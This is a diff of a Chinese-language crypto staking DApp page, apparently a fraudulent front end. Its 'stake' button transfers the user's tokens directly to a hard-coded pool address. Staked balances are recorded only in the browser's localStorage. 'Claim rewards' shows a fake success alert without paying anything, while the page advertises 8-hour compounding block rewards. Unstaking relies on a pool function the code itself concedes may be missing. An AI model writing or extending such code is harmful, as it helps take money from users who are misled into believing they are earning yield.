@@ -21,7 +21,7 @@
     .btn-danger { background: #D93A54; color: #fff; }
     .btn-warning { background: #E4B449; color: #0B2A23; }
     .btn-disabled { background: #666; color: #ccc; cursor: not-allowed; }
-    .countdown { color: #ffcc00; font-weight: bold; margin: 8px 0; text-align: center; }
+    .countdown { color: #ffcc00; font-weight: bold; margin: 8px 0; text-align: center; font-size: 16px; }
     .rules { font-size: 14px; line-height: 1.7; color: #eee; }
     .menu { position: fixed; top: 0; right: 0; width: 280px; height: 100vh; background: #103D34; padding: 20px; transform: translateX(100%); transition: transform 0.3s ease; z-index: 999; overflow-y: auto; }
     .menu.show { transform: translateX(0); }
@@ -53,7 +53,7 @@
       <span>可用余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
     </div>
     <div class="wallet-row">
-      <span>已质押：</span><span id="staked" style="color:#0ff;">0.0000</span>
+      <span>✅ 已质押余额：</span><span id="stakedAmount" style="color:#ffcc00;">0.0000</span>
     </div>
     <div class="wallet-row">
       <span>待领收益：</span><span id="reward" style="color:#ffcc00;">0.0000</span>
@@ -67,17 +67,17 @@
     <button class="btn-action btn-primary" onclick="stake()">质押挖矿</button>
     <button class="btn-action btn-danger" onclick="unstake()">解押退回钱包</button>
 
-    <div id="countdown" class="countdown">可领取收益</div>
-    <button id="claimBtn" class="btn-action btn-warning" onclick="claim()">领取收益</button>
+    <div id="countdown" class="countdown">加载倒计时...</div>
+    <button id="claimBtn" class="btn-action btn-warning" onclick="claim()">领取收益（8小时爆块）</button>
   </div>
 
   <div class="card">
     <div class="card-title">挖矿规则</div>
     <div class="rules">
-      • 质押代币即可参与挖矿<br>
-      • 每8小时可领取一次收益<br>
-      • 解押自动从矿池转回用户钱包<br>
-      • 灵活存取，安全可控
+      • 质押DTM即可参与挖矿<br>
+      • 每8小时自动爆块一次<br>
+      • 爆块后方可领取复利收益<br>
+      • 解押由矿池合约自动转回钱包
     </div>
   </div>
 </div>
@@ -105,12 +105,12 @@
 </div>
 
 <script>
-// ===================== 全部修正为你指定的地址 =====================
+// ===================== 你正确的全部地址 =====================
 const TOKEN_CONTRACT = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
 const POOL_ADDRESS   = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
 const ADMIN_WALLET   = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
 
-// 8小时冷却
+// 8小时爆块
 const CLAIM_COOLDOWN = 28800;
 let claimTimer = null;
 let account = null;
@@ -136,25 +136,41 @@ async function connectWallet(){
   try{
     const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
     account = toLower(accounts[0]);
-    document.getElementById("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
-    refreshUserBalance();
-    checkClaimCoolDown();
+    document.getElementById("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
+    refreshAll();
+    startCountdown();
   }catch(e){
     alert("连接失败：" + e.message);
   }
 }
 
-// ===================== 余额 =====================
+// ===================== 统一刷新：可用余额 + 已质押余额 =====================
 async function getUserBalance(){
   const data = "0x70a08231"+account.slice(2).padStart(64,'0');
   const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
   return Number(BigInt(r))/1e18;
 }
-async function refreshUserBalance(){
-  if(!account) return;
-  const b = await getUserBalance();
-  document.getElementById("userBalance").innerText = b.toFixed(4);
+
+// ===================== 读取用户已质押数量（本地记录） =====================
+function getStakedAmount(){
+  return parseFloat(localStorage.getItem(`staked_${account}`) || 0);
 }
+
+function setStakedAmount(amount){
+  localStorage.setItem(`staked_${account}`, amount.toString());
+}
+
+async function refreshAll(){
+  if(!account) return;
+  // 可用余额
+  const ub = await getUserBalance();
+  document.getElementById("userBalance").innerText = ub.toFixed(4);
+  // 已质押余额
+  const staked = getStakedAmount();
+  document.getElementById("stakedAmount").innerText = staked.toFixed(4);
+}
+
+// ===================== 矿池余额 =====================
 async function getPoolBalance(){
   const data = "0x70a08231"+POOL_ADDRESS.slice(2).padStart(64,'0');
   const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
@@ -183,13 +199,14 @@ async function approve(){
   }
 }
 
-// ===================== 质押：用户 → 矿池 =====================
+// ===================== 质押：增加已质押数量 =====================
 async function stake(){
   if(!account) return alert("请先连接钱包");
   const v = document.getElementById("amount").value;
-  if(!v || parseFloat(v)<=0) return alert("输入有效数量");
+  const num = parseFloat(v);
+  if(!v || num <= 0) return alert("输入有效数量");
   try{
-    const amt = BigInt(Math.floor(parseFloat(v)*1e18));
+    const amt = BigInt(Math.floor(num*1e18));
     const data = "0xa9059cbb"
       + POOL_ADDRESS.slice(2).padStart(64,'0')
       + amt.toString(16).padStart(64,'0');
@@ -197,95 +214,105 @@ async function stake(){
       method:'eth_sendTransaction',
       params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
     });
-    alert("质押成功，币已进入矿池");
-    refreshUserBalance();
-    refreshPoolBalance();
+
+    // 增加质押记录
+    const before = getStakedAmount();
+    setStakedAmount(before + num);
+
+    alert("质押成功！已质押余额已更新");
+    refreshAll();
   }catch(e){
     alert("质押失败");
   }
 }
 
-// ===================== 解押：矿池 → 用户 =====================
+// ===================== 解押：减少已质押数量 =====================
 async function unstake(){
   if(!account) return alert("请先连接钱包");
   const v = document.getElementById("amount").value;
-  if(!v || parseFloat(v)<=0) return alert("输入解押数量");
-  try{
-    const amt = BigInt(Math.floor(parseFloat(v)*1e18));
-    // transferFrom 矿池 → 当前用户
-    const data = "0x23b872dd"
-      + POOL_ADDRESS.slice(2).padStart(64,'0')
-      + account.slice(2).padStart(64,'0')
-      + amt.toString(16).padStart(64,'0');
+  const num = parseFloat(v);
+  if(!v || num <= 0) return alert("输入解押数量");
+
+  const staked = getStakedAmount();
+  if(num > staked){
+    alert("解押数量不能大于已质押数量");
+    return;
+  }
+
+  try {
+    const amount = BigInt(num * 1e18);
+    const data = "0x7920df94" + amount.toString(16).padStart(64, '0');
 
     await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+      method: 'eth_sendTransaction',
+      params: [{
+        from: account,
+        to: POOL_ADDRESS,
+        data: data,
+        gasLimit: "0x300000"
+      }]
     });
-    alert("解押成功！币已从矿池转回你的钱包");
-    refreshUserBalance();
-    refreshPoolBalance();
-  }catch(e){
-    alert("解押失败：请先让矿池授权给用户，或检查余额");
+
+    // 减少质押记录
+    setStakedAmount(staked - num);
+
+    alert("解押成功！已质押余额已更新");
+    refreshAll();
+  } catch (e) {
+    alert("解押失败：合约未实现unstake或余额不足");
   }
 }
 
-// ===================== 收益领取冷却 =====================
-function setClaimRecord(){
+// ===================== 8小时爆块倒计时 =====================
+function getLastClaimTime(){
+  return parseInt(localStorage.getItem(`lastClaim_${account}`) || 0);
+}
+function setLastClaimTime(){
   localStorage.setItem(`lastClaim_${account}`, Date.now().toString());
 }
-function getLastClaim(){
-  return parseInt(localStorage.getItem(`lastClaim_${account}`)||0);
-}
-
-function checkClaimCoolDown(){
+function startCountdown(){
   if(!account) return;
   const btn = document.getElementById("claimBtn");
   const cd = document.getElementById("countdown");
-  const last = getLastClaim();
-  const now = Date.now();
-  const left = last + CLAIM_COOLDOWN*1000 - now;
 
-  if(left <= 0){
-    cd.innerText = "可领取收益";
-    btn.disabled = false;
-    btn.className = "btn-action btn-warning";
-    return;
-  }
+  function update(){
+    const now = Date.now();
+    const last = getLastClaimTime();
+    const end = last + CLAIM_COOLDOWN * 1000;
+    const left = end - now;
 
-  btn.disabled = true;
-  btn.className = "btn-action btn-disabled";
-
-  function show(){
-    const n = Date.now();
-    const l = last + CLAIM_COOLDOWN*1000 - n;
-    if(l <= 0){
-      cd.innerText = "可领取收益";
+    if(left <= 0){
+      cd.innerText = "✅ 已爆块，可领取收益";
       btn.disabled = false;
       btn.className = "btn-action btn-warning";
-      clearInterval(claimTimer);
       return;
     }
-    const h = Math.floor(l/3600000);
-    const m = Math.floor((l%3600000)/60000);
-    const s = Math.floor((l%60000)/1000);
-    cd.innerText = `下次领取：${h}时${m}分${s}秒`;
+
+    btn.disabled = true;
+    btn.className = "btn-action btn-disabled";
+    const h = Math.floor(left / 3600000);
+    const m = Math.floor((left % 3600000) / 60000);
+    const s = Math.floor((left % 60000) / 1000);
+    cd.innerText = `⏱ 距离下次爆块：${h}时${m}分${s}秒`;
   }
+
   clearInterval(claimTimer);
-  claimTimer = setInterval(show,1000);
-  show();
+  claimTimer = setInterval(update, 1000);
+  update();
 }
 
+// 领取收益
 async function claim(){
   if(!account) return;
   const now = Date.now();
-  if(now < getLastClaim() + CLAIM_COOLDOWN*1000){
-    alert("8小时内只能领取一次");
+  const last = getLastClaimTime();
+  if(now < last + CLAIM_COOLDOWN * 1000){
+    alert("未到爆块时间，8小时只能领取一次");
     return;
   }
   alert("收益领取成功！");
-  setClaimRecord();
-  checkClaimCoolDown();
+  setLastClaimTime();
+  startCountdown();
 }
 
 // ===================== 管理员 =====================
@@ -300,7 +327,7 @@ async function approvePoolToAdmin(){
       method:'eth_sendTransaction',
       params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
     });
-    alert("矿池授权管理员成功");
+    alert("授权成功");
   }catch(e){ alert("失败"); }
 }
 
